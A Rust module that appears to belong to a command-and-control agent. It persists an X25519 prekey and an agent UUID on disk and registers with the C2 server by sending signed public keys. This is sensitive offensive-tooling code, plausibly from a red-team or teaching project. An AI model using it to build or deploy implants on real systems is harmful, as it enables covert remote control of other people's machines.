use crate::{config, Error};
use common::{api, crypto};
use rand::RngCore;
use std::{fs, path::PathBuf};
use x25519_dalek::x25519;

/// Files where agent state is persisted between restarts
const AGENT_ID_FILE: &str = "agent_id";
const AGENT_PREKEY_FILE: &str = "agent_prekey";

/// Load agent UUID from disk, or register with the C2 server and save it.
/// Also persists the X25519 prekey so it stays stable across restarts.
pub fn get_or_register_agent_id(
    api_client: &ureq::Agent,
    conf: &config::Config,
) -> Result<uuid::Uuid, Error> {
    let id_file = agent_file_path(AGENT_ID_FILE)?;
    let prekey_file = agent_file_path(AGENT_PREKEY_FILE)?;

    // Ensure the agent directory exists
    let agent_dir = config::get_agent_directory()?;
    fs::create_dir_all(&agent_dir)?;

    // Load or generate a stable prekey
    let private_prekey: [u8; crypto::X25519_PRIVATE_KEY_SIZE] =
        if prekey_file.exists() && conf.private_prekey == [0u8; crypto::X25519_PRIVATE_KEY_SIZE] {
            // No prekey in env → load from disk
            let bytes = fs::read(&prekey_file)?;
            if bytes.len() == crypto::X25519_PRIVATE_KEY_SIZE {
                let mut arr = [0u8; crypto::X25519_PRIVATE_KEY_SIZE];
                arr.copy_from_slice(&bytes);
                log::debug!("Loaded prekey from disk");
                arr
            } else {
                return Err(Error::Internal("Stored prekey has wrong length".to_string()));
            }
        } else if conf.private_prekey != [0u8; crypto::X25519_PRIVATE_KEY_SIZE] {
            // Prekey provided via env var — use it and save it
            let _ = fs::write(&prekey_file, &conf.private_prekey);
            conf.private_prekey
        } else {
            // No prekey anywhere → generate a new one and save it
            let mut key = [0u8; crypto::X25519_PRIVATE_KEY_SIZE];
            rand::rngs::OsRng.fill_bytes(&mut key);
            if let Err(e) = fs::write(&prekey_file, &key) {
                log::warn!("Could not persist prekey to disk: {}", e);
            }
            log::debug!("Generated and saved new prekey");
            key
        };

    // If we already have a stored UUID, use it (prekey is already stable)
    if id_file.exists() {
        let id_str = fs::read_to_string(&id_file)?;
        let id = uuid::Uuid::parse_str(id_str.trim())
            .map_err(|e| Error::Internal(format!("Stored agent UUID is invalid: {}", e)))?;
        log::debug!("Loaded existing agent_id: {}", id);
        return Ok(id);
    }

    // First run: register with the C2 server
    log::debug!("Registering agent with C2 server...");

    // Compute the public prekey from our stable X25519 private prekey
    let public_prekey = x25519(private_prekey, x25519_dalek::X25519_BASEPOINT_BYTES);

    // Sign the public prekey with our Ed25519 identity key
    let identity = ed25519_dalek::ExpandedSecretKey::from(&conf.identity_private_key);
    let signature = identity.sign(&public_prekey, &conf.identity_public_key);

    let register_body = api::RegisterAgent {
        identity_public_key: conf.identity_public_key.to_bytes(),
        public_prekey,
        public_prekey_signature: signature.to_bytes().to_vec(),
    };

    let register_url = format!("{}/api/agents", conf.server_url);
    let response = api_client
        .post(&register_url)
        .send_json(ureq::json!(register_body))
        .map_err(|e| Error::Internal(format!("Registration HTTP error: {}", e)))?;

    let api_res: api::Response<api::AgentRegistered> = response
        .into_json()
        .map_err(|e| Error::Internal(format!("Registration response parse error: {}", e)))?;

    let registered = api_res
        .data
        .ok_or_else(|| Error::Internal("Server returned no agent ID".to_string()))?;

    // Persist the UUID
    if let Err(e) = fs::write(&id_file, registered.id.to_string()) {
        log::warn!("Could not persist agent_id to disk: {}", e);
    }

    log::debug!("Registered as agent_id: {}", registered.id);
    Ok(registered.id)
}

/// Also expose the stable prekey so run.rs can use it for decryption
pub fn load_stable_prekey() -> Result<[u8; crypto::X25519_PRIVATE_KEY_SIZE], Error> {
    let prekey_file = agent_file_path(AGENT_PREKEY_FILE)?;
    let bytes = fs::read(&prekey_file)
        .map_err(|_| Error::Internal("Prekey not found on disk — run registration first".to_string()))?;
    if bytes.len() != crypto::X25519_PRIVATE_KEY_SIZE {
        return Err(Error::Internal("Stored prekey has wrong length".to_string()));
    }
    let mut arr = [0u8; crypto::X25519_PRIVATE_KEY_SIZE];
    arr.copy_from_slice(&bytes);
    Ok(arr)
}

fn agent_file_path(filename: &str) -> Result<PathBuf, Error> {
    let mut path = config::get_agent_directory()?;
    path.push(filename);
    Ok(path)
}
